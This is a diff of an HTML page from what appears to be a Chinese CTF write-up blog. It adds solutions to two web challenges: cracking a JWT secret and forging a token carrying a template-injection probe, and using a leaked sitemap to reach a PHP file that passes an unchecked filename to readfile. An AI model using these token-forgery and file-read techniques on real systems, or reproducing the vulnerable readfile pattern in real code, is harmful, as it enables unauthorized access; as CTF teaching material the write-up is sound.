@@ -284,6 +284,7 @@
     <li><a href="#popself">popself</a></li>
     <li><a href="#阿基里斯">阿基里斯</a></li>
     <li><a href="#expression">Expression</a></li>
+    <li><a href="#vibe-seo">Vibe SEO</a></li>
   </ol>
 </nav>
         </div>
@@ -608,7 +609,16 @@
 	
 ></p>
 <h2 id="expression">Expression
-</h2><p><img src="/p/2025%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20251024212338627.png"
+</h2><p>注册用户然后爆破密钥</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python jwt_cracker.py &#34;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6IjI2MzMyOTIzNzdAcXEuY29tIiwidXNlcm5hbWUiOiJ1c2VyXzRiZWFjMDE2NzdkZSIsImlhdCI6MTc2MzA4Mjk1NywiZXhwIjoxNzYzNjg3NzU3fQ._BrrY2Yddui7pawR8PG7BNyk9Pk8XSMHZ2E0wHN9cwE&#34;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/2025%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20251024212338627.png"
 	width="1486"
 	height="258"
 	srcset="/p/2025%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20251024212338627_hu_186e2aba0665dc64.png 480w, /p/2025%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20251024212338627_hu_705743d1e5a5f0ec.png 1024w"
@@ -620,6 +630,106 @@
 		class="gallery-image" 
 		data-flex-grow="575"
 		data-flex-basis="1382px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">jwt</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">datetime</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 定义标头（Headers）</span>
+</span></span><span class="line"><span class="cl"><span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;alg&#34;</span><span class="p">:</span> <span class="s2">&#34;HS256&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;typ&#34;</span><span class="p">:</span> <span class="s2">&#34;JWT&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 定义有效载体（Payload）</span>
+</span></span><span class="line"><span class="cl"><span class="n">token_dict</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;email&#34;</span><span class="p">:</span> <span class="s2">&#34;2633292377@qq.com&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;username&#34;</span><span class="p">:</span> <span class="s2">&#34;{{2*2}}&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 密钥</span>
+</span></span><span class="line"><span class="cl"><span class="n">secret</span> <span class="o">=</span> <span class="s1">&#39;secret&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">jwt_token</span> <span class="o">=</span> <span class="n">jwt</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="n">token_dict</span><span class="p">,</span> <span class="n">secret</span><span class="p">,</span> <span class="n">algorithm</span><span class="o">=</span><span class="s1">&#39;HS256&#39;</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;JWT Token:&#34;</span><span class="p">,</span> <span class="n">jwt_token</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="vibe-seo">Vibe SEO
+</h2><p>目录扫描得到/sitemap.xml泄露，泄露了aa__^^.php文件，访问得到</p>
+<p><img src="/p/2025%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20251114101602204.png"
+	width="1519"
+	height="313"
+	srcset="/p/2025%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20251114101602204_hu_d41f8afc10edf5b6.png 480w, /p/2025%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20251114101602204_hu_e994747f8140f515.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251114101602204"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="485"
+		data-flex-basis="1164px"
+	
+></p>
+<p>第3行错误：意思是<code>$_GET['filename']</code> 不存在，第4行错误：参数为空导致 <code>readfile('')</code>,<code>猜测可能是这样的代码 if(strlen($_GET['filename']) &gt; 0)  // 第3行</code>，<code> readfile($_GET['filename']);  // 第4行</code></p>
+<p>所以直接读filename=aa__^^.php,得到源码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$flag</span> <span class="o">=</span> <span class="nx">fopen</span><span class="p">(</span><span class="s1">&#39;/my_secret.txt&#39;</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">strlen</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;filename&#39;</span><span class="p">])</span> <span class="o">&lt;</span> <span class="mi">11</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">readfile</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;filename&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="k">echo</span> <span class="s2">&#34;Filename too long&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/2025%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20251114101853254.png"
+	width="1220"
+	height="201"
+	srcset="/p/2025%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20251114101853254_hu_16154f5f05d9408f.png 480w, /p/2025%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20251114101853254_hu_31532f886e1fb4b3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251114101853254"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="606"
+		data-flex-basis="1456px"
 	
 ></p>
 
@@ -664,6 +774,32 @@
             
                 
 <article class="">
+    <a href="/p/rce%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">RCE与文件包含总结</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/%E6%96%B0%E5%8D%8E%E4%B8%89%E5%AE%9E%E4%B9%A0%E6%89%93%E9%9D%B6/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">新华三实习打靶</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
     <a href="/p/%E6%B1%9F%E8%A5%BF%E7%9C%81%E8%B5%9Bawdp/">
         
         
@@ -696,32 +832,6 @@
 
         <div class="article-details">
             <h2 class="article-title">2025-强网杯</h2>
-        </div>
-    </a>
-</article>
-
-            
-                
-<article class="">
-    <a href="/p/2025-susctf/">
-        
-        
-
-        <div class="article-details">
-            <h2 class="article-title">2025-SUSCTF</h2>
-        </div>
-    </a>
-</article>
-
-            
-                
-<article class="">
-    <a href="/p/2025-%E7%BE%8A%E5%9F%8E%E6%9D%AF/">
-        
-        
-
-        <div class="article-details">
-            <h2 class="article-title">2025-羊城杯</h2>
         </div>
     </a>
 </article>
